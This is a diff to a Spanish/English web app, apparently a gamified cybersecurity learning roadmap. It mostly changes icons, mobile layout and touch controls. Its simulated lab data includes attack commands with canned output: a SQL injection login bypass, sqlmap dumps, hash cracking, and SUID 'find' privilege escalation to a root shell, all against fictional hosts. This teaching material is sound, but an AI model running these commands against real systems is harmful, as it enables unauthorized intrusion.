@@ -36,7 +36,7 @@ canvas{display:block}
 #ui{position:fixed;inset:0;pointer-events:none;z-index:10}
 .header{position:absolute;top:calc(12px + var(--safe-top));left:50%;transform:translateX(-50%);text-align:center;pointer-events:none;width:100%;max-width:90vw}
 .header h1{font-family:'Space Grotesk',sans-serif;font-size:clamp(1.2rem,4vw,1.8rem);color:#00ff88;text-shadow:0 0 20px rgba(0,255,136,0.5);letter-spacing:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.header p{color:#505060;font-size:0.7rem;margin-top:2px}
+.header p{color:#505060;font-size:0.7rem;margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 #tooltip{position:absolute;background:rgba(5,5,16,0.98);border:1px solid rgba(0,255,136,0.35);border-radius:12px;padding:12px 16px;min-width:200px;max-width:280px;opacity:0;transition:opacity 0.15s;pointer-events:none;box-shadow:0 0 20px rgba(0,255,136,0.15);z-index:20}
 #tooltip.visible{opacity:1}
 .tt-num{font-size:0.65rem;color:#505060;margin-bottom:2px;letter-spacing:1px}
@@ -143,7 +143,7 @@ canvas{display:block}
 .lab-modal-title-wrap{display:flex;align-items:center;gap:10px;min-width:0}
 #labInputBar{padding-bottom:calc(10px + var(--safe-bottom))}
 @media(max-width:768px){
-  .header{top:calc(8px + var(--safe-top))}
+  .header{top:calc(8px + var(--safe-top));max-width:calc(100vw - 190px)}
   .header h1{font-size:1.3rem}
   .level-panel{display:none}
   #btnInfo{display:flex}
@@ -153,7 +153,7 @@ canvas{display:block}
   .controls{top:calc(8px + var(--safe-top));right:calc(8px + var(--safe-right))}
   .ctrl-btn{width:34px;height:34px}
   .lang-toggle{align-self:flex-end}
-  .lang-btn{min-width:38px;height:28px}
+  .lang-btn{min-width:38px;height:32px}
   .control-menu{padding:6px}
   #levelOverlay .modal-card,#previewOverlay .modal-card{padding:16px 16px calc(20px + var(--safe-bottom))}
   #pdfOverlay .modal-card{padding:16px 16px calc(20px + var(--safe-bottom))}
@@ -229,7 +229,7 @@ canvas{display:block}
   #labTerminal{flex:1!important;font-size:0.7rem!important;padding:10px 12px!important;overflow-y:auto!important}
   #labInputBar{flex-wrap:nowrap!important;gap:6px!important;padding:8px 10px calc(10px + var(--safe-bottom))!important;flex-shrink:0!important}
   #labInputBar #labPrompt{display:none!important}
-  #labInputBar #labInput{min-width:0!important;font-size:0.75rem!important;flex:1!important}
+  #labInputBar #labInput{min-width:0!important;font-size:16px!important;flex:1!important}
   #labInputBar #labRun{padding:6px 12px!important;font-size:0.7rem!important;white-space:nowrap!important;flex-shrink:0!important}
   #labInputBar #labHint,#labInputBar #labReset{padding:6px 10px!important;flex-shrink:0!important}
   #theoryPanel{padding:14px 14px calc(18px + var(--safe-bottom))!important}
@@ -237,8 +237,8 @@ canvas{display:block}
 @media(max-width:480px){
   .header h1{font-size:1.15rem}
   .controls{gap:4px}
-  .ctrl-btn{width:32px;height:32px}
-  #btnInfo{width:32px;height:32px}
+  .ctrl-btn{width:38px;height:38px}
+  #btnInfo{width:38px;height:38px}
   .legend{gap:8px;padding:5px 10px}
   .leg-item{font-size:0.6rem;gap:4px}
   .leg-dot{width:7px;height:7px}
@@ -273,7 +273,7 @@ canvas{display:block}
 
 <div id="ui">
   <div class="header">
-    <h1>&gt;_ cyberpath &nbsp;<span style="color:#ff3333;font-size:0.75em;vertical-align:middle">🐉</span></h1>
+    <h1>&gt;_ cyberpath &nbsp;<span style="color:#ff3333;font-size:0.75em;vertical-align:middle"><i class="fa-solid fa-dragon"></i></span></h1>
     <p id="headerSubtitle">Roadmap interactivo · 18 plataformas</p>
   </div>
   <div id="tooltip">
@@ -296,7 +296,7 @@ canvas{display:block}
     <div class="sb-desc" id="sbDesc">—</div>
   </div>
   <div id="dragonInfo">
-    <div class="di-name">🐉 Kali</div>
+    <div class="di-name"><i class="fa-solid fa-dragon"></i> Kali</div>
     <div class="di-status" id="diStatus">Despegando...</div>
   </div>
   <button id="btnInfo" title="¿Por qué estos niveles?"><i class="fa-solid fa-circle-question" style="font-size:18px"></i></button>
@@ -431,7 +431,7 @@ canvas{display:block}
           <div>
             <span class="theory-badge" id="theoryBadge">—</span>
             <div class="theory-title" id="theoryTitle">—</div>
-            <div class="theory-subtitle" id="theorySubtitle">📚 CLASE MAGISTRAL</div>
+            <div class="theory-subtitle"><i class="fa-solid fa-book-open"></i> <span id="theorySubtitle">CLASE MAGISTRAL</span></div>
           </div>
           <div class="theory-block">
             <h4 style="color:#00ff88"><i class="fa-solid fa-book-open" style="font-size:15px"></i> <span id="theoryLearnLabel">¿Qué vas a aprender?</span></h4>
@@ -641,6 +641,7 @@ const UI_STRINGS = {
       },
     ],
     hint: 'Arrastra para rotar · Click para visitar · El dragón revela cada plataforma',
+    hintTouch: 'Desliza para rotar · Pellizca para zoom · Toca para visitar',
     dragonBoot: 'Despegando...',
     dragonPatrol: 'Patrullando la red...',
     dragonStealth: 'En modo stealth...',
@@ -681,7 +682,7 @@ const UI_STRINGS = {
     },
     lab: {
       title: 'Laboratorio de Retos',
-      theorySubtitle: '📚 CLASE MAGISTRAL',
+      theorySubtitle: 'CLASE MAGISTRAL',
       theoryLearn: '¿Qué vas a aprender?',
       theoryPoints: 'Conceptos clave',
       theoryTools: 'Comandos / Herramientas',
@@ -696,7 +697,7 @@ const UI_STRINGS = {
       lockedPrefix: 'Completa primero:',
       unlocked: 'LABORATORIO DESBLOQUEADO',
       allDone: '¡TODOS LOS LABORATORIOS COMPLETADOS!',
-      hintPrefix: '💡 Pista:',
+      hintPrefix: 'Pista:',
       unknown: 'Escribe help para ver comandos disponibles',
     },
     platformLabel: n => `PLATAFORMA #${n}`,
@@ -729,6 +730,7 @@ const UI_STRINGS = {
       },
     ],
     hint: 'Drag to rotate · Click to inspect · The dragon reveals each platform',
+    hintTouch: 'Swipe to rotate · Pinch to zoom · Tap to inspect',
     dragonBoot: 'Booting up...',
     dragonPatrol: 'Patrolling the network...',
     dragonStealth: 'Stealth mode...',
@@ -769,7 +771,7 @@ const UI_STRINGS = {
     },
     lab: {
       title: 'Challenge Lab',
-      theorySubtitle: '📚 MASTERCLASS',
+      theorySubtitle: 'MASTERCLASS',
       theoryLearn: 'What will you learn?',
       theoryPoints: 'Key concepts',
       theoryTools: 'Commands / Tools',
@@ -784,7 +786,7 @@ const UI_STRINGS = {
       lockedPrefix: 'Complete first:',
       unlocked: 'LAB UNLOCKED',
       allDone: 'ALL LABS COMPLETED!',
-      hintPrefix: '💡 Hint:',
+      hintPrefix: 'Hint:',
       unknown: 'Type help to see available commands',
     },
     platformLabel: n => `PLATFORM #${n}`,
@@ -1072,18 +1074,12 @@ function makeBodySegDataURL(glyph, segIdx) {
   const tw = ctx.measureText(glyph).width;
   cv.width  = Math.ceil(tw + pad * 2);
   cv.height = Math.ceil(fontSize * 1.5 + pad);
-  const r = 3;
   const w = cv.width, h = cv.height;
   ctx.fillStyle = 'rgba(0,10,5,0.75)';
-  ctx.beginPath();
-  ctx.moveTo(r,0); ctx.lineTo(w-r,0); ctx.arcTo(w,0,w,r,r);
-  ctx.lineTo(w,h-r); ctx.arcTo(w,h,w-r,h,r);
-  ctx.lineTo(r,h); ctx.arcTo(0,h,0,h-r,r);
-  ctx.lineTo(0,r); ctx.arcTo(0,0,r,0,r);
-  ctx.closePath(); ctx.fill();
+  ctx.fillRect(0, 0, w, h);
   ctx.strokeStyle = `rgba(0,255,136,${Math.max(0.06, 0.28 - segIdx*0.006)})`;
   ctx.lineWidth = 0.6;
-  ctx.stroke();
+  ctx.strokeRect(0, 0, w, h);
   ctx.font = `bold ${fontSize}px 'JetBrains Mono', monospace`;
   ctx.textBaseline = 'middle';
   ctx.textAlign = 'center';
@@ -1473,7 +1469,7 @@ function applyLanguage() {
   legendBeginner.textContent = s.levelLabels[0];
   legendIntermediate.textContent = s.levelLabels[1];
   legendAdvanced.textContent = s.levelLabels[2];
-  sceneHintEl.textContent = s.hint;
+  sceneHintEl.textContent = isMobile ? s.hintTouch : s.hint;
   btnInfo.title = s.controls.info;
   btnMenu.title = s.controls.menu;
   btnMenu.setAttribute('aria-label', btnMenu.title);
@@ -1558,10 +1554,21 @@ renderer.domElement.addEventListener('mousedown',e=>{if(isMobile)return;dragging
 window.addEventListener('mouseup',()=>{dragging=false;renderer.domElement.style.cursor='';});
 window.addEventListener('mousemove',e=>{if(dragging&&!isMobile){sph.theta-=(e.clientX-prevM.x)*0.007;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.clientY-prevM.y)*0.007));prevM={x:e.clientX,y:e.clientY};applyCam();}handleHover(e.clientX,e.clientY);});
 renderer.domElement.addEventListener('wheel',e=>{if(isMobile){e.preventDefault();return;}zoomF=Math.max(MIN_Z,Math.min(MAX_Z,zoomF-e.deltaY*0.0015));applyCam();},{passive:false});
-let prevT=null, touchStartPos=null, touchMoved=false;
-renderer.domElement.addEventListener('touchstart',e=>{if(e.touches.length===1){prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};touchStartPos={x:e.touches[0].clientX,y:e.touches[0].clientY};touchMoved=false;handleHover(e.touches[0].clientX,e.touches[0].clientY);}},{passive:true});
-renderer.domElement.addEventListener('touchmove',e=>{if(!prevT||e.touches.length!==1)return;const dx=e.touches[0].clientX-touchStartPos.x,dy=e.touches[0].clientY-touchStartPos.y;if(Math.sqrt(dx*dx+dy*dy)>8)touchMoved=true;sph.theta-=(e.touches[0].clientX-prevT.x)*0.008;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.touches[0].clientY-prevT.y)*0.008));prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};applyCam();handleHover(e.touches[0].clientX,e.touches[0].clientY);e.preventDefault();},{passive:false});
-renderer.domElement.addEventListener('touchend',e=>{if(!touchMoved&&hovered&&e.changedTouches.length===1){showPlatformPreview(hovered);}touchStartPos=null;},{passive:true});
+let prevT=null, touchStartPos=null, touchMoved=false, pinchDist=null;
+function touchDist(t0,t1){const dx=t1.clientX-t0.clientX,dy=t1.clientY-t0.clientY;return Math.sqrt(dx*dx+dy*dy);}
+renderer.domElement.addEventListener('touchstart',e=>{
+  if(e.touches.length===1){prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};touchStartPos={x:e.touches[0].clientX,y:e.touches[0].clientY};touchMoved=false;handleHover(e.touches[0].clientX,e.touches[0].clientY);}
+  else if(e.touches.length===2){pinchDist=touchDist(e.touches[0],e.touches[1]);hovered=null;tooltip.classList.remove('visible');}
+},{passive:true});
+renderer.domElement.addEventListener('touchmove',e=>{
+  if(e.touches.length===2){
+    const d=touchDist(e.touches[0],e.touches[1]);
+    if(pinchDist)zoomF=Math.max(MIN_Z,Math.min(MAX_Z,zoomF+(d-pinchDist)*0.0018));
+    pinchDist=d;touchMoved=true;applyCam();e.preventDefault();return;
+  }
+  if(!prevT||e.touches.length!==1)return;const dx=e.touches[0].clientX-touchStartPos.x,dy=e.touches[0].clientY-touchStartPos.y;if(Math.sqrt(dx*dx+dy*dy)>8)touchMoved=true;sph.theta-=(e.touches[0].clientX-prevT.x)*0.008;sph.phi=Math.max(0.3,Math.min(1.3,sph.phi-(e.touches[0].clientY-prevT.y)*0.008));prevT={x:e.touches[0].clientX,y:e.touches[0].clientY};applyCam();handleHover(e.touches[0].clientX,e.touches[0].clientY);e.preventDefault();
+},{passive:false});
+renderer.domElement.addEventListener('touchend',e=>{if(e.touches.length<2)pinchDist=null;if(!touchMoved&&hovered&&e.changedTouches.length===1){showPlatformPreview(hovered);}touchStartPos=null;},{passive:true});
 
 function setControlsMenuOpen(open){
   controlsMenuOpen=open;
@@ -1657,6 +1664,7 @@ function handleHover(cx,cy){
 }
 renderer.domElement.addEventListener('click',e=>{if(hovered){e.preventDefault();showPlatformPreview(hovered);}});
 function showPlatformPreview(rawPlatform){
+  hovered=null;tooltip.classList.remove('visible');
   activePreviewPlatform = rawPlatform;
   const p = getPlatformCopy(rawPlatform);
   document.getElementById('pvName').textContent=p.name;
@@ -1764,18 +1772,18 @@ PORT     STATE SERVICE  VERSION
 | http-title: CyberCorp — Login
 <span style="color:#00ff88">8080/tcp open  http     Node.js Express</span>
 | http-title: Admin Panel — NO AUTH REQUIRED
-<span style="color:#ff5555">⚠ Panel admin expuesto sin autenticación</span>`,
+<span style="color:#ff5555"><i class="fa-solid fa-triangle-exclamation"></i> Panel admin expuesto sin autenticación</span>`,
       'curl http://10.10.10.5': `<!DOCTYPE html><html>
 <title>CyberCorp Login</title>
 <!-- TODO: remove debug endpoint /debug -->
 <form action="/login">...</form>`,
       'curl http://10.10.10.5:8080': `{"status":"ok","app":"CyberCorp Admin v1.2","endpoints":["/status","/users","/flag"]}
 <span style="color:#ff9500">→ Hay un endpoint /flag interesante...</span>`,
-      'curl http://10.10.10.5:8080/flag': `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+      'curl http://10.10.10.5:8080/flag': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG ENCONTRADA!</span>
 <span style="color:#a78bfa">╔═══════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{nmap_reveals_all_5ec3t}</span>  <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚═══════════════════════════════╝</span>
-<span style="color:#808090">+150 XP — Misión completada 🎯</span>`,
+<span style="color:#808090">+150 XP — Misión completada <i class="fa-solid fa-bullseye"></i></span>`,
       'curl http://10.10.10.5:8080/users': `[{"id":1,"user":"admin","role":"superadmin"},
  {"id":2,"user":"jdoe","role":"analyst"},
  {"id":3,"user":"flag_holder","role":"guest"}]`,
@@ -1836,14 +1844,14 @@ base64 flag.txt > flag.txt.enc
 rm flag.txt`,
       'cat flag.txt.enc': `<span style="color:#ff9500">RkxBR3tsaW51eF9iYXNpY3NfMHduM2R9Cg==</span>
 <span style="color:#808090">(parece base64...)</span>`,
-      'base64 -d flag.txt.enc': `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+      'base64 -d flag.txt.enc': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG ENCONTRADA!</span>
 <span style="color:#a78bfa">╔═══════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>         <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚═══════════════════════════════════╝</span>
 <span style="color:#808090">+120 XP — ¡Buen trabajo!</span>`,
       'ls /tmp': `<span style="color:#ff9500">.hidden_flag</span>  payload.sh  systemd-private-xxx`,
       'cat /tmp/.hidden_flag': `<span style="color:#808090"># backup — por si acaso</span>
-<span style="color:#00ff88">✔ ¡FLAG ALTERNATIVA!</span>
+<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG ALTERNATIVA!</span>
 <span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>
 <span style="color:#808090">+120 XP</span>`,
       'ls .secret': `<span style="color:#808090">credentials.txt  notes.md</span>`,
@@ -1917,11 +1925,11 @@ Disallow: /admin/
       "curl -X POST http://vuln-app.local/login -d \"user=' OR '1'='1' --&pass=x\"": `<span style="color:#00ff88">{"success":true,"user":"admin","role":"superadmin","token":"eyJ..."}</span>
 <span style="color:#ff9500">→ Autenticación bypasseada completamente</span>`,
       "curl http://vuln-app.local/dashboard -H \"Authorization: eyJ...\"": `{"welcome":"admin","menu":["users","flags","settings"]}`,
-      "curl http://vuln-app.local/flags -H \"Authorization: eyJ...\"": `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+      "curl http://vuln-app.local/flags -H \"Authorization: eyJ...\"": `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG ENCONTRADA!</span>
 <span style="color:#a78bfa">╔════════════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>         <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚════════════════════════════════════════╝</span>
-<span style="color:#808090">+200 XP — Nivel Intermedio superado 🔥</span>`,
+<span style="color:#808090">+200 XP — Nivel Intermedio superado <i class="fa-solid fa-fire"></i></span>`,
       "sqlmap -u http://vuln-app.local/login --data='user=admin&pass=x' --dbs": `[*] starting sqlmap
 [INFO] testing connection to target
 [INFO] testing if POST parameter 'user' is dynamic
@@ -1944,7 +1952,7 @@ Table: flags
 +----+----------------------------------+
 | 1  | <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>  |
 +----+----------------------------------+
-<span style="color:#00ff88">✔ ¡FLAG OBTENIDA CON SQLMAP! +200 XP</span>`,
+<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG OBTENIDA CON SQLMAP! +200 XP</span>`,
       'help': `Comandos disponibles:
   curl -X POST &lt;url&gt; -d "param=val"  — petición POST
   curl &lt;url&gt; -H "Header: val"        — petición con header
@@ -2006,11 +2014,11 @@ Are you sure you want to continue connecting? (yes/no): `,
 Last login: Mon Apr  1 03:14:07 2026
 <span style="color:#ff9500">admin@victim:~$</span> <span style="color:#808090">← ahora estás dentro, busca la flag</span>`,
       'ls /home/admin': `Desktop  Documents  user.txt  .bash_history`,
-      'cat /home/admin/user.txt': `<span style="color:#00ff88">✔ ¡FLAG ENCONTRADA!</span>
+      'cat /home/admin/user.txt': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG ENCONTRADA!</span>
 <span style="color:#a78bfa">╔══════════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{john_cr4ck3d_th3_h4sh!}</span>       <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚══════════════════════════════════════╝</span>
-<span style="color:#808090">+250 XP — ¡Hash crackeado y dentro del sistema! 💀</span>`,
+<span style="color:#808090">+250 XP — ¡Hash crackeado y dentro del sistema! <i class="fa-solid fa-skull"></i></span>`,
       'help': `Comandos disponibles:
   cat &lt;archivo&gt;                    — leer archivo
   hash-identifier                  — identificar tipo de hash
@@ -2068,11 +2076,11 @@ Last login: Mon Apr  1 03:14:07 2026
       '/usr/bin/find . -exec cat /root/root.txt \\;': `<span style="color:#ff5555">cat: /root/root.txt: Permission denied</span>
 <span style="color:#808090">→ find sigue siendo www-data para I/O. Necesitas una shell.</span>`,
       '/usr/bin/find . -exec /bin/bash -p \\;': `<span style="color:#ff5555">bash-5.0# </span><span style="color:#00ff88">← Shell root obtenida!</span>`,
-      'cat /root/root.txt': `<span style="color:#00ff88">✔ ¡FLAG ROOT ENCONTRADA!</span>
+      'cat /root/root.txt': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ¡FLAG ROOT ENCONTRADA!</span>
 <span style="color:#a78bfa">╔══════════════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{su1d_f1nd_pr1v_3sc_r00t!}</span>       <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚══════════════════════════════════════════╝</span>
-<span style="color:#808090">+350 XP — ¡Root obtenido! Nivel Avanzado 💀🔥</span>`,
+<span style="color:#808090">+350 XP — ¡Root obtenido! Nivel Avanzado <i class="fa-solid fa-skull"></i><i class="fa-solid fa-fire"></i></span>`,
       'uname -a': `Linux webserver 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 GNU/Linux`,
       'cat /etc/passwd | grep -v nologin': `root:x:0:0:root:/root:/bin/bash
 www-data:x:33:33:www-data:/var/www:/bin/sh
@@ -2134,14 +2142,14 @@ PORT     STATE SERVICE  VERSION
 | http-title: CyberCorp — Login
 <span style="color:#00ff88">8080/tcp open  http     Node.js Express</span>
 | http-title: Admin Panel — NO AUTH REQUIRED
-<span style="color:#ff5555">⚠ Admin panel exposed without authentication</span>`,
+<span style="color:#ff5555"><i class="fa-solid fa-triangle-exclamation"></i> Admin panel exposed without authentication</span>`,
         'curl http://10.10.10.5:8080': `{"status":"ok","app":"CyberCorp Admin v1.2","endpoints":["/status","/users","/flag"]}
 <span style="color:#ff9500">→ There is an interesting /flag endpoint...</span>`,
-        'curl http://10.10.10.5:8080/flag': `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+        'curl http://10.10.10.5:8080/flag': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> FLAG FOUND!</span>
 <span style="color:#a78bfa">╔═══════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{nmap_reveals_all_5ec3t}</span>  <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚═══════════════════════════════╝</span>
-<span style="color:#808090">+150 XP — Mission complete 🎯</span>`,
+<span style="color:#808090">+150 XP — Mission complete <i class="fa-solid fa-bullseye"></i></span>`,
         help: `Available commands in this challenge:
   nmap [options] &lt;ip&gt;   — scan ports
   curl &lt;url&gt;            — send an HTTP request
@@ -2181,13 +2189,13 @@ PORT     STATE SERVICE  VERSION
       commands: {
         'cat flag.txt.enc': `<span style="color:#ff9500">RkxBR3tsaW51eF9iYXNpY3NfMHduM2R9Cg==</span>
 <span style="color:#808090">(looks like Base64...)</span>`,
-        'base64 -d flag.txt.enc': `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+        'base64 -d flag.txt.enc': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> FLAG FOUND!</span>
 <span style="color:#a78bfa">╔═══════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>         <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚═══════════════════════════════════╝</span>
 <span style="color:#808090">+120 XP — Nice work!</span>`,
         'cat /tmp/.hidden_flag': `<span style="color:#808090"># backup — just in case</span>
-<span style="color:#00ff88">✔ ALT FLAG FOUND!</span>
+<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ALT FLAG FOUND!</span>
 <span style="color:#ff9500">FLAG{linux_basics_0wn3d}</span>
 <span style="color:#808090">+120 XP</span>`,
         'cat .secret/notes.md': `TODO:
@@ -2241,11 +2249,11 @@ PORT     STATE SERVICE  VERSION
 <span style="color:#505060">SELECT * FROM users WHERE username='admin' --' AND password='x'</span>`,
         "curl -X POST http://vuln-app.local/login -d \"user=' OR '1'='1' --&pass=x\"": `<span style="color:#00ff88">{"success":true,"user":"admin","role":"superadmin","token":"eyJ..."}</span>
 <span style="color:#ff9500">→ Authentication fully bypassed</span>`,
-        "curl http://vuln-app.local/flags -H \"Authorization: eyJ...\"": `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+        "curl http://vuln-app.local/flags -H \"Authorization: eyJ...\"": `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> FLAG FOUND!</span>
 <span style="color:#a78bfa">╔════════════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>         <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚════════════════════════════════════════╝</span>
-<span style="color:#808090">+200 XP — Intermediate level cleared 🔥</span>`,
+<span style="color:#808090">+200 XP — Intermediate level cleared <i class="fa-solid fa-fire"></i></span>`,
         "sqlmap -u http://vuln-app.local/login --data='user=admin&pass=x' -D webapp_db -T flags --dump": `Database: webapp_db
 Table: flags
 +----+----------------------------------+
@@ -2253,7 +2261,7 @@ Table: flags
 +----+----------------------------------+
 | 1  | <span style="color:#ff9500">FLAG{sql1_byp4ss_auth_m4st3r}</span>  |
 +----+----------------------------------+
-<span style="color:#00ff88">✔ FLAG RETRIEVED WITH SQLMAP! +200 XP</span>`,
+<span style="color:#00ff88"><i class="fa-solid fa-check"></i> FLAG RETRIEVED WITH SQLMAP! +200 XP</span>`,
         help: `Available commands:
   curl -X POST &lt;url&gt; -d "param=val"  — send a POST request
   curl &lt;url&gt; -H "Header: val"        — send a request with headers
@@ -2299,11 +2307,11 @@ Enter the hash: $6$salt123$8c6976e5b5410415...
 <span style="color:#00ff88">Welcome to Ubuntu 20.04 LTS</span>
 Last login: Mon Apr  1 03:14:07 2026
 <span style="color:#ff9500">admin@victim:~$</span> <span style="color:#808090">← You are in. Find the flag.</span>`,
-        'cat /home/admin/user.txt': `<span style="color:#00ff88">✔ FLAG FOUND!</span>
+        'cat /home/admin/user.txt': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> FLAG FOUND!</span>
 <span style="color:#a78bfa">╔══════════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{john_cr4ck3d_th3_h4sh!}</span>       <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚══════════════════════════════════════╝</span>
-<span style="color:#808090">+250 XP — Hash cracked and system accessed! 💀</span>`,
+<span style="color:#808090">+250 XP — Hash cracked and system accessed! <i class="fa-solid fa-skull"></i></span>`,
         help: `Available commands:
   cat &lt;file&gt;                     — read a file
   hash-identifier                — identify a hash type
@@ -2357,11 +2365,11 @@ Last login: Mon Apr  1 03:14:07 2026
         '/usr/bin/find . -exec cat /root/root.txt \\;': `<span style="color:#ff5555">cat: /root/root.txt: Permission denied</span>
 <span style="color:#808090">→ find still uses www-data for I/O. You need a shell.</span>`,
         '/usr/bin/find . -exec /bin/bash -p \\;': `<span style="color:#ff5555">bash-5.0# </span><span style="color:#00ff88">← Root shell obtained!</span>`,
-        'cat /root/root.txt': `<span style="color:#00ff88">✔ ROOT FLAG FOUND!</span>
+        'cat /root/root.txt': `<span style="color:#00ff88"><i class="fa-solid fa-check"></i> ROOT FLAG FOUND!</span>
 <span style="color:#a78bfa">╔══════════════════════════════════════════╗</span>
 <span style="color:#a78bfa">║</span>  <span style="color:#ff9500">FLAG{su1d_f1nd_pr1v_3sc_r00t!}</span>       <span style="color:#a78bfa">║</span>
 <span style="color:#a78bfa">╚══════════════════════════════════════════╝</span>
-<span style="color:#808090">+350 XP — Root obtained! Advanced level cleared 💀🔥</span>`,
+<span style="color:#808090">+350 XP — Root obtained! Advanced level cleared <i class="fa-solid fa-skull"></i><i class="fa-solid fa-fire"></i></span>`,
         help: `Available commands:
   whoami / id                        — user information
   sudo -l                            — sudo permissions
@@ -2418,12 +2426,12 @@ function markCompleted(labId) {
     const s = getStrings();
     if (idx < LABS.length - 1) {
       const nextView = getLabCopy(LABS[idx + 1]);
-      labPrint(`<span style="color:#00ff88;font-weight:bold">╔══ 🔓 ${s.lab.unlocked} ══╗</span>`);
+      labPrint(`<span style="color:#00ff88;font-weight:bold">╔══ <i class="fa-solid fa-lock-open"></i> ${s.lab.unlocked} ══╗</span>`);
       labPrint(`<span style="color:#e0e0e8">   → ${nextView.title}</span>`);
       labPrint(`<span style="color:#505060">╚═══════════════════════════════════╝</span>`);
       labPrint('');
     } else {
-      labPrint(`<span style="color:#00ff88;font-weight:bold">🏆 ${s.lab.allDone}</span>`);
+      labPrint(`<span style="color:#00ff88;font-weight:bold"><i class="fa-solid fa-trophy"></i> ${s.lab.allDone}</span>`);
       labPrint('');
     }
     saveProgress();
@@ -2489,7 +2497,7 @@ function loadLab(lab) {
     const prevView = getLabCopy(prev);
     // Mostrar brevemente un mensaje de bloqueo sin cambiar el lab activo
     const flash = document.createElement('div');
-    flash.innerHTML = `<span style="color:#ff5555">🔒 ${s.lab.lockedPrefix} <b style="color:#e0e0e8">${prevView.title}</b></span>`;
+    flash.innerHTML = `<span style="color:#ff5555"><i class="fa-solid fa-lock"></i> ${s.lab.lockedPrefix} <b style="color:#e0e0e8">${prevView.title}</b></span>`;
     flash.style.cssText = 'position:absolute;bottom:60px;left:50%;transform:translateX(-50%);background:rgba(255,85,85,0.12);border:1px solid rgba(255,85,85,0.3);border-radius:8px;padding:8px 16px;font-size:0.72rem;white-space:nowrap;z-index:99;pointer-events:none';
     document.getElementById('labBodyFlex').style.position='relative';
     document.getElementById('labBodyFlex').appendChild(flash);
@@ -2547,7 +2555,7 @@ function runLabCommand(raw) {
   }
   if (cmd === 'hint') {
     const h = activeLab.hints[hintIndex % activeLab.hints.length];
-    labPrint(`<span style="color:#ff9500">${getStrings().lab.hintPrefix} ${h}</span>`);
+    labPrint(`<span style="color:#ff9500"><i class="fa-solid fa-lightbulb"></i> ${getStrings().lab.hintPrefix} ${h}</span>`);
     hintIndex++;
     saveTerminalHistory();
     return;
@@ -2595,7 +2603,7 @@ function refreshSidebar() {
       el.style.borderBottom = isMob ? '3px solid transparent' : '';
       // Badge locked
       const badge = el.querySelector('.sb-status');
-      if (badge) { badge.textContent = '🔒'; badge.style.color = '#505060'; }
+      if (badge) { badge.innerHTML = '<i class="fa-solid fa-lock"></i>'; badge.style.color = '#505060'; }
     } else {
       el.style.opacity = '1';
       el.style.cursor = 'pointer';
@@ -2604,7 +2612,7 @@ function refreshSidebar() {
       el.style.borderBottom = isMob ? (active ? '3px solid #a78bfa' : '3px solid transparent') : '';
       const badge = el.querySelector('.sb-status');
       if (badge) {
-        if (done) { badge.textContent = '✓'; badge.style.color = '#00ff88'; }
+        if (done) { badge.innerHTML = '<i class="fa-solid fa-check"></i>'; badge.style.color = '#00ff88'; }
         else { badge.textContent = ''; }
       }
     }
